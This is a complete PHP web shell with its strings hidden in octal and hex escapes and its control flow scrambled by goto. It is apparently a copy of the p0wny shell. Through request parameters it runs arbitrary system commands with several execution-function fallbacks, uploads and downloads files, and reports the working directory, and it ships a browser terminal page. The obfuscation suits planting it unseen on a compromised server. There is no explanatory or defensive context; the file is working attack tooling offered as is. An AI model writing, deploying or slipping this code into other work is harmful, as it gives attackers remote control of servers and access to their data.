<?php
 goto VaFJl; nzCAK: function featurePwd() { return array("\143\x77\x64" => base64_encode(getcwd())); } goto L2vLO; zZCBT: function featureShell($cmd, $cwd) { $stdout = ''; if (preg_match("\57\136\134\163\x2a\x63\144\134\163\52\x28\x32\76\46\x31\51\77\x24\57", $cmd)) { chdir(expandPath("\176")); } elseif (preg_match("\57\x5e\134\163\x2a\x63\x64\x5c\x73\x2b\x28\56\53\x29\134\163\52\50\x32\x3e\46\x31\51\77\44\57", $cmd)) { chdir($cwd); preg_match("\x2f\136\x5c\x73\52\x63\x64\134\x73\53\50\133\136\134\163\x5d\53\51\x5c\163\x2a\x28\62\76\46\x31\51\x3f\x24\57", $cmd, $match); chdir(expandPath($match[1])); } elseif (preg_match("\57\136\134\x73\x2a\x64\157\x77\x6e\x6c\x6f\x61\144\x5c\163\53\133\x5e\x5c\163\x5d\x2b\x5c\x73\x2a\50\x32\x3e\x26\x31\x29\77\x24\57", $cmd)) { chdir($cwd); preg_match("\x2f\136\x5c\163\x2a\x64\x6f\167\156\154\x6f\x61\144\x5c\x73\53\50\133\136\x5c\163\135\x2b\x29\134\x73\52\x28\x32\x3e\x26\x31\51\x3f\x24\57", $cmd, $match); return featureDownload($match[1]); } else { chdir($cwd); $stdout = executeCommand($cmd); } return array("\x73\164\144\157\165\x74" => base64_encode($stdout), "\143\167\x64" => base64_encode(getcwd())); } goto nzCAK; gfaOY: function initShellConfig() { global $SHELL_CONFIG; if (isRunningWindows()) { $username = getenv("\125\x53\105\122\116\x41\115\105"); if ($username !== false) { $SHELL_CONFIG["\165\x73\145\x72\x6e\141\155\145"] = $username; } } else { $pwuid = posix_getpwuid(posix_geteuid()); if ($pwuid !== false) { $SHELL_CONFIG["\165\x73\x65\162\x6e\141\x6d\x65"] = $pwuid["\156\141\x6d\145"]; } } $hostname = gethostname(); if ($hostname !== false) { $SHELL_CONFIG["\150\x6f\163\x74\156\141\155\x65"] = $hostname; } } goto kSOiW; jPnQZ: ?>
<!doctypehtml><html><head><meta charset="UTF-8"><title>p0wny@shell:~#</title><meta content="width=device-width,initial-scale=1"name="viewport"><style>body,html{margin:0;padding:0;background:#333;color:#eee;font-family:monospace;width:100vw;height:100vh;overflow:hidden}::-webkit-scrollbar-track{border-radius:8px;background-color:#353535}::-webkit-scrollbar{width:8px;height:8px}::-webkit-scrollbar-thumb{border-radius:8px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#bcbcbc}#shell{background:#222;box-shadow:0 0 5px rgba(0,0,0,.3);font-size:10pt;display:flex;flex-direction:column;align-items:stretch;max-width:calc(100vw - 2 * var(--shell-margin));max-height:calc(100vh - 2 * var(--shell-margin));resize:both;overflow:hidden;width:100%;height:100%;margin:var(--shell-margin) auto}#shell-content{overflow:auto;padding:5px;white-space:pre-wrap;flex-grow:1}#shell-logo{font-weight:700;color:#ff4180;text-align:center}:root{--shell-margin:25px}@media (min-width:1200px){:root{--shell-margin:50px!important}}@media (max-width:991px),(max-height:600px){#shell-logo{font-size:6px;margin:-25px 0}:root{--shell-margin:0!important}#shell{resize:none}}@media (max-width:767px){#shell-input{flex-direction:column}}@media (max-width:320px){#shell-logo{font-size:5px}}.shell-prompt{font-weight:700;color:#75df0b}.shell-prompt>span{color:#1bc9e7}#shell-input{display:flex;box-shadow:0 -1px 0 rgba(0,0,0,.3);border-top:rgba(255,255,255,.05) solid 1px;padding:10px 0}#shell-input>label{flex-grow:0;display:block;padding:0 5px;height:30px;line-height:30px}#shell-input #shell-cmd{height:30px;line-height:30px;border:none;background:0 0;color:#eee;font-family:monospace;font-size:10pt;width:100%;align-self:center;box-sizing:border-box}#shell-input div{flex-grow:1;align-items:stretch}#shell-input input{outline:0}</style><script>var SHELL_CONFIG=<?php  goto HhwfS; rn9Ch: function expandPath($path) { if (preg_match("\x23\x5e\x28\176\x5b\x61\x2d\x7a\x41\55\x5a\x30\55\x39\x5f\56\55\x5d\x2a\51\50\x2f\56\52\51\x3f\x24\x23", $path, $match)) { exec("\x65\143\150\157\40{$match["\61"]}", $stdout); return $stdout[0] . $match[2]; } return $path; } goto KcOxq; VaFJl: $SHELL_CONFIG = array("\165\x73\145\162\x6e\x61\x6d\145" => "\160\x30\x77\156\x79", "\x68\157\x73\x74\x6e\141\x6d\145" => "\x73\x68\145\154\x6c"); goto rn9Ch; cLqpL: function featureUpload($path, $file, $cwd) { chdir($cwd); $f = @fopen($path, "\167\x62"); if ($f === FALSE) { return array("\x73\x74\144\157\165\x74" => base64_encode("\x49\156\166\141\x6c\x69\144\x20\x70\141\164\150\x20\x2f\x20\156\x6f\40\167\162\151\164\x65\x20\160\145\162\155\x69\x73\163\151\157\156\x2e"), "\143\x77\144" => base64_encode(getcwd())); } else { fwrite($f, base64_decode($file)); fclose($f); return array("\163\164\x64\x6f\x75\x74" => base64_encode("\x44\x6f\x6e\x65\x2e"), "\x63\167\144" => base64_encode(getcwd())); } } goto gfaOY; xlX17: function featureDownload($filePath) { $file = @file_get_contents($filePath); if ($file === FALSE) { return array("\163\x74\144\157\x75\x74" => base64_encode("\106\x69\154\145\40\156\157\x74\x20\146\157\165\x6e\x64\x20\57\x20\x6e\x6f\40\162\145\141\x64\x20\160\145\x72\155\151\x73\163\151\157\156\56"), "\143\167\x64" => base64_encode(getcwd())); } else { return array("\x6e\x61\155\x65" => base64_encode(basename($filePath)), "\146\151\x6c\x65" => base64_encode($file)); } } goto cLqpL; x8C4R: function isRunningWindows() { return stripos(PHP_OS, "\127\111\116") === 0; } goto zZCBT; HhwfS: echo json_encode($SHELL_CONFIG); goto KJXQ0; SYLHC: function executeCommand($cmd) { $output = ''; if (function_exists("\x65\170\145\x63")) { exec($cmd, $output); $output = implode("\xa", $output); } else { if (function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\170\x65\x63")) { $output = shell_exec($cmd); } else { if (allFunctionExist(array("\163\171\163\x74\145\x6d", "\157\142\x5f\x73\x74\141\162\x74", "\157\142\x5f\x67\x65\164\137\143\x6f\x6e\x74\145\156\x74\x73", "\157\142\137\145\x6e\144\x5f\143\x6c\x65\141\x6e"))) { ob_start(); system($cmd); $output = ob_get_contents(); ob_end_clean(); } else { if (allFunctionExist(array("\x70\141\163\163\164\x68\x72\165", "\x6f\142\137\163\164\141\x72\164", "\x6f\142\137\x67\145\164\x5f\143\157\156\164\145\156\x74\x73", "\x6f\142\x5f\x65\156\x64\x5f\143\154\x65\141\x6e"))) { ob_start(); passthru($cmd); $output = ob_get_contents(); ob_end_clean(); } else { if (allFunctionExist(array("\160\x6f\x70\145\156", "\146\x65\x6f\x66", "\146\162\145\x61\144", "\160\143\x6c\x6f\x73\x65"))) { $handle = popen($cmd, "\x72"); while (!feof($handle)) { $output .= fread($handle, 4096); } pclose($handle); } else { if (allFunctionExist(array("\160\162\x6f\x63\x5f\x6f\160\145\x6e", "\x73\x74\162\x65\x61\x6d\137\147\145\164\137\143\157\156\164\145\156\x74\x73", "\160\x72\157\143\137\143\x6c\157\163\145"))) { $handle = proc_open($cmd, array(0 => array("\x70\151\160\145", "\x72"), 1 => array("\160\151\160\x65", "\167")), $pipes); $output = stream_get_contents($pipes[1]); proc_close($handle); } } } } } } return $output; } goto x8C4R; KcOxq: function allFunctionExist($list = array()) { foreach ($list as $entry) { if (!function_exists($entry)) { return false; } } return true; } goto SYLHC; L2vLO: function featureHint($fileName, $cwd, $type) { chdir($cwd); if ($type == "\143\x6d\144") { $cmd = "\143\157\x6d\160\x67\x65\x6e\x20\x2d\x63\x20{$fileName}"; } else { $cmd = "\x63\157\x6d\160\147\145\x6e\x20\x2d\146\40{$fileName}"; } $cmd = "\x2f\x62\151\156\x2f\142\141\x73\150\x20\55\x63\x20\42{$cmd}\x22"; $files = explode("\xa", shell_exec($cmd)); foreach ($files as &$filename) { $filename = base64_encode($filename); } return array("\146\151\154\145\x73" => $files); } goto xlX17; kSOiW: if (isset($_GET["\146\145\x61\164\165\x72\145"])) { $response = NULL; switch ($_GET["\146\x65\x61\164\x75\162\x65"]) { case "\x73\150\145\154\154": $cmd = $_POST["\143\155\144"]; if (!preg_match("\x2f\62\x3e\x2f", $cmd)) { $cmd .= "\40\x32\76\x26\61"; } $response = featureShell($cmd, $_POST["\x63\x77\144"]); break; case "\x70\x77\x64": $response = featurePwd(); break; case "\150\151\x6e\x74": $response = featureHint($_POST["\x66\151\154\145\156\141\155\x65"], $_POST["\x63\x77\144"], $_POST["\164\171\x70\145"]); break; case "\165\160\x6c\157\x61\144": $response = featureUpload($_POST["\x70\x61\x74\150"], $_POST["\146\x69\x6c\145"], $_POST["\x63\167\x64"]); } header("\103\157\156\164\145\x6e\164\x2d\x54\x79\160\145\x3a\40\x61\160\x70\x6c\151\x63\141\x74\x69\x6f\156\57\152\x73\x6f\156"); echo json_encode($response); die; } else { initShellConfig(); } goto jPnQZ; KJXQ0: ?>
,CWD=null,commandHistory=[],historyPosition=0,eShellCmdInput=null,eShellContent=null;function _insertCommand(e){eShellContent.innerHTML+="\n\n",eShellContent.innerHTML+='<span class="shell-prompt">'+genPrompt(CWD)+"</span> ",eShellContent.innerHTML+=escapeHtml(e),eShellContent.innerHTML+="\n",eShellContent.scrollTop=eShellContent.scrollHeight}function _insertStdout(e){eShellContent.innerHTML+=escapeHtml(e),eShellContent.scrollTop=eShellContent.scrollHeight}function _defer(e){setTimeout(e,0)}function featureShell(e){_insertCommand(e),/^\s*upload\s+[^\s]+\s*$/.test(e)?featureUpload(e.match(/^\s*upload\s+([^\s]+)\s*$/)[1]):/^\s*clear\s*$/.test(e)?eShellContent.innerHTML="":makeRequest("?feature=shell",{cmd:e,cwd:CWD},function(e){e.hasOwnProperty("file")?featureDownload(atob(e.name),e.file):(_insertStdout(atob(e.stdout)),updateCwd(atob(e.cwd)))})}function featureHint(){if(0!==eShellCmdInput.value.trim().length){var e=eShellCmdInput.value.split(" "),n=1===e.length?"cmd":"file";makeRequest("?feature=hint",{filename:"cmd"==n?e[0]:e[e.length-1],cwd:CWD,type:n},function(e){if(!(e.files.length<=1))if(e.files=e.files.map(function(e){return atob(e)}),2===e.files.length)if("cmd"==n)eShellCmdInput.value=e.files[0];else{var t=eShellCmdInput.value;eShellCmdInput.value=t.replace(/([^\s]*)$/,e.files[0])}else _insertCommand(eShellCmdInput.value),_insertStdout(e.files.join("\n"))})}}function featureDownload(e,t){var n=document.createElement("a");n.setAttribute("href","data:application/octet-stream;base64,"+t),n.setAttribute("download",e),n.style.display="none",document.body.appendChild(n),n.click(),document.body.removeChild(n),_insertStdout("Done.")}function featureUpload(t){var e=document.createElement("input");e.setAttribute("type","file"),e.style.display="none",document.body.appendChild(e),e.addEventListener("change",function(){getBase64(e.files[0]).then(function(e){makeRequest("?feature=upload",{path:t,file:e,cwd:CWD},function(e){_insertStdout(atob(e.stdout)),updateCwd(atob(e.cwd))})},function(){_insertStdout("An unknown client-side error occurred.")})}),e.click(),document.body.removeChild(e)}function getBase64(o,e){return new Promise(function(e,t){var n=new FileReader;n.onload=function(){e(n.result.match(/base64,(.*)$/)[1])},n.onerror=t,n.readAsDataURL(o)})}function genPrompt(e){var t=e=e||"~";if(3<e.split("/").length){var n=e.split("/");t="…/"+n[n.length-2]+"/"+n[n.length-1]}return SHELL_CONFIG.username+"@"+SHELL_CONFIG.hostname+':<span title="'+e+'">'+t+"</span>#"}function updateCwd(e){if(e)return CWD=e,void _updatePrompt();makeRequest("?feature=pwd",{},function(e){CWD=atob(e.cwd),_updatePrompt()})}function escapeHtml(e){return e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}function _updatePrompt(){document.getElementById("shell-prompt").innerHTML=genPrompt(CWD)}function _onShellCmdKeyDown(e){switch(e.key){case"Enter":featureShell(eShellCmdInput.value),insertToHistory(eShellCmdInput.value),eShellCmdInput.value="";break;case"ArrowUp":0<historyPosition&&(historyPosition--,eShellCmdInput.blur(),eShellCmdInput.value=commandHistory[historyPosition],_defer(function(){eShellCmdInput.focus()}));break;case"ArrowDown":if(historyPosition>=commandHistory.length)break;++historyPosition===commandHistory.length?eShellCmdInput.value="":(eShellCmdInput.blur(),eShellCmdInput.focus(),eShellCmdInput.value=commandHistory[historyPosition]);break;case"Tab":e.preventDefault(),featureHint()}}function insertToHistory(e){commandHistory.push(e),historyPosition=commandHistory.length}function makeRequest(e,n,t){var o=new XMLHttpRequest;o.open("POST",e,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),o.onreadystatechange=function(){if(4===o.readyState&&200===o.status)try{var e=JSON.parse(o.responseText);t(e)}catch(e){alert("Error while parsing response: "+e)}},o.send(function(){var e=[];for(var t in n)n.hasOwnProperty(t)&&e.push(encodeURIComponent(t)+"="+encodeURIComponent(n[t]));return e.join("&")}())}document.onclick=function(e){e=e||window.event;var t=window.getSelection();"SELECT"!==(e.target||e.srcElement).tagName&&(t.toString()||eShellCmdInput.focus())},window.onload=function(){eShellCmdInput=document.getElementById("shell-cmd"),eShellContent=document.getElementById("shell-content"),updateCwd(),eShellCmdInput.focus()}</script></head><body><div id="shell"><pre id="shell-content">
                <div id="shell-logo">
   _  _   <span></span>
_|| || |_ <span></span>
|_  ..  _|<span></span>
|_      _|<span></span>
  |_||_|  <span></span>
          <span></span>
                </div>
            </pre><div id="shell-input"><label class="shell-prompt"for="shell-cmd"id="shell-prompt">???</label><div><input id="shell-cmd"name="cmd"onkeydown="_onShellCmdKeyDown(event)"></div></div></div></body></html>
